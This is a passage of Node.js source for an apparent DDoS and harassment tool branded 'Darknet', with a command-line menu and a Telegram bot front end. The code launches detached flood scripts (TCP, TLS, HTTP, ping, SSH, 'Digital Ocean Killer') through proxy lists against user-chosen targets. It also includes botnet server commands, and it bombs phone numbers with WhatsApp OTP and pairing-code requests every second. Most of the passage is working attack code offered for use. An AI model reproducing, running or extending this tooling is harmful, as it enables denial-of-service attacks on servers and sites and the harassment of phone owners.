⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀

                    TCP Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : TCP FLOOD
Creator  : V3 And Joseph`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/23`);
const sikma = path.join(__dirname, `/lib/cache/1`);
exec(`node ${metode} ${target} ${port} ${duration} 10`)
exec(`node ${sikma} http://${target} ${duration}`)
sigma()
};
// ================================================== //
async function transformBot(args) {
  permen.question('Insert Your Telegram Token: ', (telegramToken) => {
    permen.question('Insert Your Telegram ID: ', (telegramId) => {
      const Sikma = new TelegramBot(telegramToken, { polling: true });
      
      console.clear();
      console.log(`Successfully Connected With:\nBot Token:\t${telegramToken}\nChat ID:\t${telegramId}`);

      const mainMenu = {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'Flood Notification', callback_data: 'flood_notif' },
              { text: 'Subdomain Finder', callback_data: 'subdo_finder' }
            ],
            [
              { text: 'Kill OTP', callback_data: 'kill_otp' },
              { text: 'Kill SSH', callback_data: 'kill_ssh' }
            ],
            [
              { text: 'Kill PING', callback_data: 'kill_ping' },
              { text: 'Killer Digital Ocean', callback_data: 'kill_do' }
            ],
            [
              { text: 'Attack', callback_data: 'start_attack' }
            ],
            [
              { text: 'Main Menu', callback_data: 'main_start' }
            ],
            [
              { text: 'Back CLI', callback_data: 'back_cli' }
            ]
          ]
        }
      };

      const methodsList = {
        reply_markup: {
          keyboard: [
            [{ text: 'Ninja' }, { text: 'Tls' }],
            [{ text: 'Strike' }, { text: 'Httpx' }],
            [{ text: 'Bypass' }, { text: 'Thunder' }],
            [{ text: 'Storm' }, { text: 'Glory' }],
            [{ text: 'Slim' }, { text: 'Harder' }],
            [{ text: 'Raw' }]
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      };
      
      const extendLimau = {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'Back To Main Menu', callback_data: 'main_start' } /*,
              { text: '', callback_data: '' }*/
            ]
          ]
        }
      };

      Sikma.onText(/\/start/, (msg) => {
        Sikma.sendMessage(telegramId, 'Welcome to **Darknet Mode Bot Tele**. Select an option:', mainMenu);
      });

      Sikma.on('callback_query', async (callbackQuery) => {
        const action = callbackQuery.data;

        switch (action) {
          case 'main_start':
            await Sikma.sendMessage(telegramId, 'Welcome to **Darknet Mode Bot Tele**. Select an option:', mainMenu);
            break;
          case 'kill_ssh':
            await KillSSH1(telegramId, Sikma);
            break;
          case 'flood_notif':
            await handleFloodNotif(telegramId, Sikma);
            break;
          case 'subdo_finder':
            await subdomainFinder(telegramId, Sikma);
            break;
          case 'kill_ping':
            await handleKillPING(telegramId, Sikma);
            break;
          case 'kill_do':
            await handleKillDO(telegramId, Sikma);
            break;
          case 'kill_otp':
            await handleKillOTP(telegramId, Sikma);
            break;
          case 'start_attack':
            await startAttackPrompt(telegramId, Sikma);
            break;
          case 'back_cli':
            await Sikma.sendMessage(telegramId, 'Bot Will Stop And Back To CLI Mode.')
            await Sikma.stopPolling();
            await banner();
            sigma()
            break;
          default:
            Sikma.sendMessage(telegramId, 'Unknown action.');
            break;
        }
      });
// [==================================================================================] //
      async function handleKillDO(telegramId, Sikma) {
        const pathSSH = path.join(__dirname, `/lib/cache/19`);
        const pathFlood = path.join(__dirname, `/lib/cache/3`);
        const pathRaw = path.join(__dirname, `/lib/cache/14`);
        Sikma.sendMessage(telegramId, 'Enter Target URL:')
        Sikma.once('message', async (msg) => {
          const targetUrl = msg.text;
          Sikma.sendMessage(telegramId, 'Enter Target IP:')
          Sikma.once('message', async (msg) => {
            const targetIP = msg.text;
            Sikma.sendMessage(telegramId, 'Enter Duration:')
            Sikma.once('message', async (msg) => {
              const duration = parseInt(msg.text);
              Sikma.sendMessage(telegramId, `Attack Started\n**Digital Ocean Killer**\n**Target URL:** ${targetUrl}\n**Target IP:** ${targetIP}\n**Duration:** ${duration}`, extendLimau);
              const SSHWorker = spawn('node', [pathSSH, targetIP, '22', 'root', duration], {
                detached: true,
                stdio: 'ignore',
            });
            const FloodWorker = spawn('node', [pathFlood, targetUrl, duration], {
              detached: true,
              stdio: 'ignore',
          });
          const RawWorker = spawn('node', [pathRaw, `http://${targetIP}`, duration], {
            detached: true,
            stdio: 'ignore',
        });
        RawWorker.unref();
          FloodWorker.unref();
            SSHWorker.unref();
                        })
          })
        })
      }
// [==================================================================================] //
      async function startAttackPrompt(telegramId, Sikma) {
        Sikma.sendMessage(telegramId, 'Select Attack Methods:', methodsList)
        Sikma.once('message', async (msg) => {
          const yabe = msg.text;
          let yabai = ''
          let methods = ''
          let kimakk = ''
          let target = ''
          let duration = ''
          const destroy = path.join(__dirname, `/lib/cache/3`);
          const storm = path.join(__dirname, `/lib/cache/4`);
          const rape = path.join(__dirname, `/lib/cache/5`);
          const execDestroy =`node ${destroy} ${target} ${duration} 100 1 proxy.txt`
          const execStorm = `node ${storm} ${target} ${duration} 100 15 proxy.txt`
          const execRape =`node ${rape} ${target} ${duration} 60 7 proxy.txt`
          if (yabe === 'Ninja') {
            yabai = 'ninja';
            methods = path.join(__dirname, `/lib/cache/3`);
              kimakk = `node ${methods} ${target} ${duration}`;
          } else if (yabe === 'Raw') {
            yabai = 'raw';
            methods = path.join(__dirname, `/lib/cache/16`);
              kimakk = `node ${methods} ${target} ${duration}`;
          } else if (yabe === 'Strike') {
            yabai = '11';
            methods = path.join(__dirname, `/lib/cache/11`);
              kimakk = `node ${methods} GET ${target} ${duration} 10 90 proxy.txt --full`;
          } else if (yabe === 'Storm') {
            yabai = 'storm';
            methods = path.join(__dirname, `/lib/cache/13`);
              kimakk = `node ${methods} ${target} ${duration} 100 10 proxy.txt`;
          } else if (yabe === 'Tls') {
            yabai = 'tls';
            methods = path.join(__dirname, `/lib/cache/2`);
              kimakk = `node ${methods} ${target} ${duration}`;
          } else if (yabe === 'Glory') {
            yabai = 'glory';
            methods = path.join(__dirname, `/lib/cache/5`);
              kimakk = `node ${methods} ${target} ${duration} 32 10 proxy.txt`;
          } else if (yabe === 'Harder') {
            yabai = 'harder';
            methods = path.join(__dirname, `/lib/cache/4`);
              kimakk = `node ${methods} ${target} ${duration} 32 10 proxy.txt`;
          } else if (yabe === 'Bypass') {
            yabai = 'bypass';
            methods = path.join(__dirname, `/lib/cache/9`);
              kimakk = `node ${methods} ${target} ${duration} 100 10 proxy.txt`;
          } else if (yabe === 'Httpx') {
            yabai = 'httpx';
            methods = path.join(__dirname, `/lib/cache/6`);
              kimakk = `node ${methods} ${target} ${duration} 50 4 proxy.txt`;
          } else if (yabe === 'Thunder') {
            yabai = 'thunder'
            methods = path.join(__dirname, `/lib/cache/10`)
              kimakk = `node ${methods} ${target} ${duration} 50 10 proxy.txt`
          } else if (yabe === 'Slim') {
            Sikma.sendMessage(telegramId, 'Nice Choices.')
          } else {
            Sikma.sendMessage(telegramId, 'Undefined Methods')
            return
          }
          Sikma.sendMessage(telegramId, 'Enter Target Link:')
          Sikma.once('message', async (msg) => {
             target = msg.text;
            Sikma.sendMessage(telegramId, 'Enter Duration:')
            Sikma.once('message', async (msg) => {
               duration = parseInt(msg.text)
              await Sikma.sendMessage(telegramId, `Attack Launched\nMethods: ${yabe}\nTarget: ${target}\nDuration\b${duration}\nCreator: V3 `)
              if (yabe === 'Slim') {
                const DestroyWorker = spawn(execDestroy, {
                  detached: true,
                  stdio: 'ignore',
              });
              const StormWorker = spawn(execStorm, {
                detached: true,
                stdio: 'ignore',
            });
            const RapeWorker = spawn(execRape, {
              detached: true,
              stdio: 'ignore',
          });
          DestroyWorker.unref();
          StormWorker.unref();
          RapeWorker.unref();
              } else {
                exec(kimakk)
              }
            })
          })
        })
      }
// [==================================================================================] //
      async function subdomainFinder(telegramId, Sikma) {
        Sikma.sendMessage(telegramId, 'Enter domain\nExample: google.com');
        Sikma.once('message', async (msg) => {
          try {
            let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${msg.text}`);
            let uniqueSubdomains = [...new Set(response.data.data)];
            let hasilmanuk = uniqueSubdomains.map((data) => {
              return `${data}`;
            }).join('\n');
            Sikma.sendMessage(telegramId, '**Subdomain Finder** For ' + msg.text + '\n' + hasilmanuk, extendLimau);
          } catch (error) {
            Sikma.sendMessage(telegramId, 'Error fetching subdomains. Please try again later.');
          }
        });
      }
// [==================================================================================] //
      async function handleFloodNotif(telegramId, Sikma) {
        Sikma.sendMessage(telegramId, 'Enter target phone number:');
        Sikma.once('message', async (msg) => {
          const phoneNumber = msg.text.replace(/\D/g, '');
          Sikma.sendMessage(telegramId, 'Enter duration in seconds:');
          Sikma.once('message', async (msg) => {
            const duration = parseInt(msg.text, 10);
            if (isNaN(duration) || duration <= 0) {
              Sikma.sendMessage(telegramId, 'Invalid duration.');
            } else {
              Sikma.sendMessage(telegramId, `Starting **flood notification** to ${phoneNumber} for ${duration} seconds.`, { parse_mode: 'Markdown' });
              await startFlooder(phoneNumber, duration, telegramId, Sikma);
            }
          });
        });
      }
// [==================================================================================] //
      async function handleKillOTP(telegramId, Sikma) {
        Sikma.sendMessage(telegramId, 'Enter target phone number:');
        Sikma.once('message', async (msg) => {
          let phoneNumber = '+' + parseInt(msg.text);
          Sikma.sendMessage(telegramId, 'Enter duration in seconds:');
          Sikma.once('message', async (msg) => {
            const duration = parseInt(msg.text, 10);
            if (isNaN(duration) || duration <= 0) {
              Sikma.sendMessage(telegramId, 'Invalid duration.');
            } else {
              Sikma.sendMessage(telegramId, `Starting **flood notification** to ${phoneNumber} for ${duration} seconds.`, { parse_mode: 'Markdown' });
                    await startFlooder1(phoneNumber, duration, telegramId, Sikma);
            }
          });
        });
      }
// [==================================================================================] //
      async function handleKillPING(telegramId, Sikma) {
        const pathPING = path.join(__dirname, `/lib/cache/18`);
        Sikma.sendMessage(telegramId, 'Enter target IP Address:');
        Sikma.once('message', async (msg) => {
          const TargetIP = msg.text
          Sikma.sendMessage(telegramId, 'Enter duration in seconds:');
          Sikma.once('message', async (msg) => {
            const duration = parseInt(msg.text, 10);
            if (isNaN(duration) || duration <= 0) {
              Sikma.sendMessage(telegramId, 'Invalid duration.');
            } else {
              Sikma.sendMessage(telegramId, `Attack Started\n**Methods:** KILL PING\n**Target:** ${TargetIP}\n**Duration:** ${duration}`, extendLimau);
              exec(`node ${pathPING} ${TargetIP} 65500 10 10 ${duration}`);
            }
          });
      });
      }
// [==================================================================================] //
      async function KillSSH1(telegramId, Sikma) {
        const pathSSH = path.join(__dirname, `/lib/cache/19`);
        Sikma.sendMessage(telegramId, 'Enter target IP Address:');
        Sikma.once('message', async (msg) => {
          const TargetIP = msg.text
          Sikma.sendMessage(telegramId, 'Enter target Port:');
          Sikma.once('message', async (msg) => {
            const targetPort = msg.text  
          Sikma.sendMessage(telegramId, 'Enter duration in seconds:');
          Sikma.once('message', async (msg) => {
            const duration = parseInt(msg.text, 10);
            if (isNaN(duration) || duration <= 0) {
              Sikma.sendMessage(telegramId, 'Invalid duration.');
            } else {
              Sikma.sendMessage(telegramId, `Attack Started\n**Methods:** KILL SSH\n**Target:** ${TargetIP}\n**Port:** ${targetPort}\n**Duration:** ${duration}`, extendLimau);
              exec(`node ${pathSSH} ${TargetIP} ${targetPort} root ${duration}`);
            }
          });
        });
      });
      }
// [==================================================================================] //
      async function startFlooder1(phoneNumber, duration, telegramId, Sikma) {
        const manuk = parsePhoneNumberFromString(phoneNumber);
        const countryCode = manuk.countryCallingCode;
        const nationalNum = manuk.nationalNumber;
      
        try {
          const { state, saveState } = await useMultiFileAuthState('sessions');
      
          const logger = pino({
            level: 'silent',
          });
      
          const conn = makeWaSocket({
            auth: state,
            mobile: true,
            logger: logger,
          });
      
          Sikma.sendMessage(
            telegramId,
            'Kill OTP Started\n**Target:** ' + phoneNumber + '\n**Duration:** ' + duration + '\n**Creator: PermenMD**',
            extendLimau
          );
          const requestOTP = async () => {
            try {
              await conn.requestRegistrationCode({
                phoneNumber: '+' + phoneNumber,
                phoneNumberCountryCode: countryCode,
                phoneNumberNationalNumber: nationalNum,
                phoneNumberMobileCountryCode: countryCode
              });
            } catch (error) {
              if (error.reason === 'temporarily_unavailable') {
                clearInterval(intervalId);
      
                console.log('Temporarily unavailable, restarting...');
                setTimeout(() => {
                  intervalId = setInterval(requestOTP, 1000);
                }, 10000);
              } else {
                console.log('Error:', error);
              }
            }
          };
      
          let intervalId = setInterval(requestOTP, 1000);
      
          setTimeout(() => {
            clearInterval(intervalId);
            Sikma.sendMessage(telegramId, `Kill OTP stopped after ${duration} seconds.`);
          }, duration * 1000);
          
        } catch (error) {
          console.log('Error during flooder initialization:', error);
        }
      }
//[========================================]
async function startFlooder(phoneNumber, duration, telegramId, Sikma) {
        try {
          const { version } = await fetchLatestBaileysVersion();
          const { state, saveState } = await useMultiFileAuthState('sessions');
          const logger = pino({ level: 'silent' });
          const conn = makeWASocket({
            printQRInTerminal: false,
            auth: state,
            version: version,
            logger: logger,
          });

          Sikma.sendMessage(telegramId, 'Pairing Code Flooder Started\n**Target:** ' + phoneNumber + '\n**Duration:** ' + duration + '\n**Creator: PermenMD**', extendLimau);

          let intervalId = setInterval(async () => {
            try {
              const pairingCode = await conn.requestPairingCode(phoneNumber);
              const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
            } catch (error) {
            }
          }, 1000);

          setTimeout(() => {
            clearInterval(intervalId);
            Sikma.sendMessage(telegramId, 'Flooding ended.');
          }, duration * 1000);

        } catch (error) {
        }
      }

    });
  });
} 
// --$--$-$-$7$+-$+$7$$
async function chat_ai() {
permen.question('[\x1b[1m\x1b[31m Chat AI\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  console.log(`Chat Ai Has Ended`)
  sigma()
} else {
  try {
let skidie = await axios.get(`https://widipe.com/gpt4?text=${yakin}`)
let kiddies = await skidie.data
console.log(`
[ Ragbot ]:
${kiddies.data}
`)
  } catch (error) {
      console.log(error)
  }
  chat_ai()
}})
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By V3

Thx To:
Allah SWT
Permen (base)
Joseph Sikma (My Friend)
Ryan Dahl (pembuat nodejs)
Chat Gpt 
`
permen.question(
'[\x1b[1m\x1b[32mDarknet\x1b[0m]: ', (input) => {
    const [command, ...args] = input.trim().split(' ');

  if (command === 'help') {
    console.log(`
NAME      │ ALIAS              │ DESCRIPTION
──────────┼────────────────────┼────────────────────────────────────
 help       │ ----               │ Menunjukan Semua Command
 methods    │ ----               │ Menunjukan Semua Methods
 clear      │ ----               │ Menunjukan Banner mu
 ongoing    │ ----               │ Menumjukan serangan
 tutorial   │ ----               │ Tutorial Penggunaan
 credits    │ ----               │ credits
 news       │ ----               │ Melihat news update
 bot-tele   │ ----               │ Mengubah Menjadi Bot Tele
 botnet     │ ----               │ Menyerang Dengan Banyak Server
 cekserver  │ ----               │ Mengecek Server 
 add-server │ ----               │ Menambah Server
`);
    sigma();
  } else if (command === 'botnet-methods') {
  	console.log(`
█░░ ▄▀█ █▄█ █▀▀ █▀█ ▀▀█     
█▄▄ █▀█ ░█░ ██▄ █▀▄ ░░█ 

| - https     
| - ninja
| - flood
| - bypass
| - mix
| - raw
| - strike
| - tls
| - tlsv2
| - storm
| - destroy
| - httpx
| - java
| - nuke
| - harder
| - http-raw
| - sigma
| - glory
| - pluto

`);
    sigma();
  } else if (command === 'methods') {
    methods()
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if(command === 'bot-tele') {
  	transformBot(args) 
      sigma()
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'gataulah') {
    handleAttackCommand(args);
  } else if (command === 'tutorial') {
  	console.log(`
 Tutorial Menggunakan
 methods target port time
 contoh => tls https://website.com 443 60`);
    sigma();
  } else if (command === 'udp-raw') {
    udp_flood(args);
  } else if (command === 'flood') {
  	flood(args);
  } else if (command === 'tls') {
  	tls(args);
  } else if (command === 'ninja') {
  	ninja(args);
  } else if (command === 'harder') {
  	harder(args);
  } else if (command === 'glory') {
  	glory(args);
  } else if (command === 'httpx') {
  	httpx(args);
  } else if (command === 'sigma') {
  	sigma(args);
  } else if (command === 'bomb') {
  	bomb(args);
  } else if (command === 'bypass') {
  	bypass(args);
  } else if (command === 'java') {
  	java(args);
  } else if (command === 'strike') {
  	strike(args);
  } else if (command === 'pluto') {
  	pluto(args);
  } else if (command === 'storm') {
  	storm(args);
  } else if (command === 'raw') {
  	raw(args);
  } else if (command === 'stars') {
  	stars(args);
  } else if (command === 'http1') {
  	http1(args);
  } else if (command === 'kill-do') {
  	killDo(args);
  } else if (command === 'samp') {
  	samp(args);
  } else if (command === 'kill-otp') {
  	killOTP(args);
  } else if (command === 'tcp') {
  	tcp(args);
  } else if (command === 'spampair') {
  	SpamPair(args);
  } else if (command === 'kill-ping') {
    pod(args);
    } else if (command === 'add-server') {
    processBotnetEndpoint(args);
  } else if (command === 'cekserver') {
    checkBotnetEndpoints()
  } else if (command === 'botnet') {
    Botnethitam(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'ai') {
    console.log(`ZyoJir Ai Ragbot Started
Type "exit" To Stop Chat`);
    chat_ai()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()